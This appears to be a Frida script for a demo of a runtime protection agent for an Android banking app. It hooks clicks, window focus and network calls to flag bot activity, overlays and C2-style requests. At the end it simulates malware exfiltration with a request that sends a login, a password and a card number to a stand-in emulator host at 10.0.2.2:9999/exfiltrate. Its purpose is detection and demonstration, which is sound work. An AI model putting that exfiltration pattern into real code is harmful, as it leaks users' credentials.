Script.nextTick(function() {
    Java.perform(function () {
        send({"type": "info", "message": "RASP Agent injected. Installing hooks..."});

        var TRUSTED_HOSTS = ["10.0.2.2:8888", "localhost", "127.0.0.1"];
        var c2Fired = false;

        function isTrusted(url) {
            for (var i = 0; i < TRUSTED_HOSTS.length; i++) {
                if (url.indexOf(TRUSTED_HOSTS[i]) !== -1) return true;
            }
            return false;
        }

        // HOOK 1: ATS
        try {
            var View = Java.use("android.view.View");
            View.dispatchTouchEvent.implementation = function (ev) {
                var deviceId = ev.getDeviceId();
                if (deviceId < 0) {
                    send({"type": "critical", "threat": "ATS Bot Activity",
                          "message": "Programmatic click BLOCKED! Source: " + ev.getSource() + ", DeviceID: " + deviceId});
                    return true;
                }
                return this.dispatchTouchEvent(ev);
            };
            send({"type": "info", "message": "Hook #1 (ATS / View.dispatchTouchEvent) — OK"});
        } catch (e) {
            send({"type": "error", "message": "Hook #1 failed: " + e.message});
        }

        // HOOK 2: Overlay
        try {
            var Activity = Java.use("android.app.Activity");
            Activity.onWindowFocusChanged.implementation = function (hasFocus) {
                if (!hasFocus) {
                    var isKeyboard = false;
                    try {
                        isKeyboard = this.getWindow().getDecorView()
                            .getRootWindowInsets()
                            .isVisible(Java.use("android.view.WindowInsets$Type").ime());
                    } catch(e2) {}
                    if (!isKeyboard) {
                        send({"type": "alert", "threat": "Overlay Attack",
                              "message": "Window focus lost — possible overlay covering the screen."});
                    }
                }
                this.onWindowFocusChanged(hasFocus);
            };
            send({"type": "info", "message": "Hook #2 (Overlay / onWindowFocusChanged) — OK"});
        } catch (e) {
            send({"type": "error", "message": "Hook #2 failed: " + e.message});
        }

        // HOOK 3a: DefaultHttpClient
        try {
            var DefaultHttpClient = Java.use("org.apache.http.impl.client.DefaultHttpClient");
            DefaultHttpClient.execute.overload(
                "org.apache.http.client.methods.HttpUriRequest"
            ).implementation = function (request) {
                var url = request.getURI().toString();
                if (isTrusted(url)) {
                    send({"type": "warning", "threat": "Network Request",
                          "message": "Legitimate: HTTP " + request.getMethod() + " -> " + url});
                } else {
                    send({"type": "critical", "threat": "C2 Exfiltration",
                          "message": "SUSPICIOUS: HTTP " + request.getMethod() + " -> " + url + " [NOT a bank server!]"});
                }
                return this.execute(request);
            };
            send({"type": "info", "message": "Hook #3a (Network / DefaultHttpClient.execute) — OK"});
        } catch (e) {
            send({"type": "error", "message": "Hook #3a failed: " + e.message});
        }

        // HOOK 3b: URL.$init
        try {
            var URLClass = Java.use("java.net.URL");
            URLClass.$init.overload("java.lang.String").implementation = function (url) {
                if (!isTrusted(url)) {
                    send({"type": "critical", "threat": "C2 Exfiltration",
                          "message": "SUSPICIOUS URL inside process: " + url + " [NOT a bank server!]"});
                }
                this.$init(url);
            };
            send({"type": "info", "message": "Hook #3b (Network / URL.$init) — OK"});
        } catch (e) {
            send({"type": "error", "message": "Hook #3b failed: " + e.message});
        }

        send({"type": "info", "message": "=== All hooks active. Monitoring started. ==="});

        // C2-триггер: удаляем через adb shell rm (надёжнее чем File.delete())
        // Флаг c2Fired гарантирует однократное срабатывание
        var Runtime = Java.use("java.lang.Runtime");
        var triggerPath = "/data/local/tmp/c2_trigger";

        setInterval(function() {
            try {
                var f = Java.use("java.io.File").$new(triggerPath);
                if (f.exists() && !c2Fired) {
                    c2Fired = true;
                    // Удаляем файл через shell чтобы гарантировать удаление
                    Runtime.getRuntime().exec("rm " + triggerPath);
                    send({"type": "info", "message": "C2 trigger detected — simulating malware exfiltration..."});

                    // Делаем C2-запрос в главном потоке чтобы хук URL.$init сработал
                    Java.scheduleOnMainThread(function() {
                        try {
                            var URL2 = Java.use("java.net.URL");
                            var url2 = URL2.$new("http://10.0.2.2:9999/exfiltrate?login=jack&pass=Jack%40123&card=4111111111111111");
                            var conn = url2.openConnection();
                            conn.setConnectTimeout(3000);
                            conn.connect();
                        } catch(e) {}
                    });
                }
            } catch(e2) {}
        }, 500);
    });
});